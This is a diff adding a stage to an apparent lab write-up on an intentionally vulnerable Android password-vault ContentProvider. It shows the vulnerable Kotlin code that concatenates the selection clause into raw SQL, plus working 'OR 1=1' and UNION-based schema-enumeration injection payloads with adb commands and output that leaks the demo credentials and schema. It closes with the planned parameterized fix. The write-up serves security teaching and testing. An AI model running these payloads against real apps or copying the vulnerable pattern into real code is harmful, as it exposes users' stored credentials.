@@ -130,3 +130,82 @@ keytool -genkeypair -v -keystore keystores/vaultraider-debug.jks -alias vaultrai
   ```
 
 v0.1 closed: the full `VaultRaider → ContentResolver → VaultContentProvider → Room` circuit works end to end, with the `ContentProvider` still completely unhardened — ready as the baseline for stage v0.2 (exploiting the SQL injection).
+
+## v0.2 — Exploiting the SQL injection (vuln #1)
+
+Recap of the vulnerable code (unchanged since v0.1, `VaultContentProvider.query()`):
+
+```kotlin
+val sql = buildString {
+    append("SELECT * FROM credentials")
+    if (!selection.isNullOrBlank()) append(" WHERE $selection")
+    if (!sortOrder.isNullOrBlank()) append(" ORDER BY $sortOrder")
+}
+dao.rawQuery(SimpleSQLiteQuery(sql))
+```
+
+`selection` is concatenated straight into the SQL string; `selectionArgs` is never read. Any caller of `ContentResolver.query()` fully controls the `WHERE` clause.
+
+**Operational note before testing:** the app installed on the emulator still had demo data seeded before the English-translation commit (`-ficticio` suffixes instead of `-fake`). Since `DemoDataSeeder` only seeds an empty table, a plain reinstall over the existing install doesn't reseed it. Fixed with `adb shell pm clear dev.guillermomartin.vaultkeeper` followed by relaunching the app, which forces a fresh seed from current source.
+
+### Baseline — what a legitimate client would send
+
+The hypothetical Chrome-extension client (narrative only, not implemented in this repo) would scope its lookup to one site, e.g. `selection = "site = 'example.test'"`:
+
+```
+$ adb shell "content query --uri content://dev.guillermomartin.vaultkeeper.provider/credentials --where \"site = 'example.test'\""
+Row: 0 id=1, site=example.test, username=demo@example.test, password=Tr0ub4dor&3-fake
+```
+
+Exactly one row, as intended.
+
+### Attack 1 — boolean-based scope bypass
+
+Run from `VaultRaider`'s "selection (WHERE)" field, confirmed on-device (Pixel_4 emulator, API 37.1):
+
+```
+selection: site = 'nope.invalid' OR '1'='1'
+```
+
+Real output shown by `VaultRaider`:
+
+```
+id=1 | site=example.test | username=demo@example.test | password=Tr0ub4dor&3-fake
+id=2 | site=mail.example | username=demo.mail@example.test | password=Hunter2-fake
+id=3 | site=shop.example | username=demo.shop@example.test | password=Cassette-Battery-Staple-fake
+```
+
+Despite filtering on a site that doesn't exist (`nope.invalid`), all 3 credentials come back — the injected `OR '1'='1'` makes the `WHERE` clause always true. Any app that can reach this exported provider can read every credential regardless of what the provider's author intended to scope the query to.
+
+### Attack 2 — UNION-based schema enumeration
+
+Same field, a different payload that doesn't even reference the `credentials` table's own data:
+
+```
+selection: 0=1 UNION SELECT 1, name, sql, 'x' FROM sqlite_master WHERE type='table'
+```
+
+Real output shown by `VaultRaider`:
+
+```
+id=1 | site=android_metadata | username=CREATE TABLE android_metadata (locale TEXT) | password=x
+id=1 | site=credentials | username=CREATE TABLE `credentials` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `site` TEXT NOT NULL, `username` TEXT NOT NULL, `password` TEXT NOT NULL) | password=x
+id=1 | site=room_master_table | username=CREATE TABLE room_master_table (id INTEGER PRIMARY KEY,identity_hash TEXT) | password=x
+id=1 | site=sqlite_sequence | username=CREATE TABLE sqlite_sequence(name,seq) | password=x
+```
+
+The 4-column `UNION SELECT` matches `credentials`' column count, so the `ContentProvider`'s hardcoded `SELECT *` happily returns rows from `sqlite_master` instead — leaking the full schema of every table in the database, including Room's internal bookkeeping tables. This is full arbitrary-SQL injection through the same `selection` field a legitimate client would use for a simple site lookup, not just a missing filter.
+
+Independently corroborated at the OS level (same `ContentResolver` → `ContentProvider` binder call any app or `adb shell` makes, not routed through `VaultRaider`'s own UID):
+
+```
+$ adb shell "content query --uri content://dev.guillermomartin.vaultkeeper.provider/credentials --where \"0=1 UNION SELECT 1, name, sql, 'x' FROM sqlite_master WHERE type='table'\""
+Row: 0 id=1, site=android_metadata, username=CREATE TABLE android_metadata (locale TEXT), password=x
+Row: 1 id=1, site=credentials, username=CREATE TABLE `credentials` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `site` TEXT NOT NULL, `username` TEXT NOT NULL, `password` TEXT NOT NULL), password=x
+Row: 2 id=1, site=room_master_table, username=CREATE TABLE room_master_table (id INTEGER PRIMARY KEY,identity_hash TEXT), password=x
+Row: 3 id=1, site=sqlite_sequence, username=CREATE TABLE sqlite_sequence(name,seq), password=x
+```
+
+### v0.2 closed
+
+The SQL injection vulnerability (vuln #1) is proven with real, reproducible output from `VaultRaider` itself, not just ad-hoc tooling. `sortOrder` is built with the exact same string-concatenation pattern and is equally injectable, even though this stage didn't exercise it through the UI (`VaultRaider` only exposes a `selection` field) — it stays in scope for the fix. v0.3 fixes this by parametrizing `selection`/`selectionArgs` through `SimpleSQLiteQuery`'s bind-argument form and validating `sortOrder`/`projection` against an explicit column allowlist.
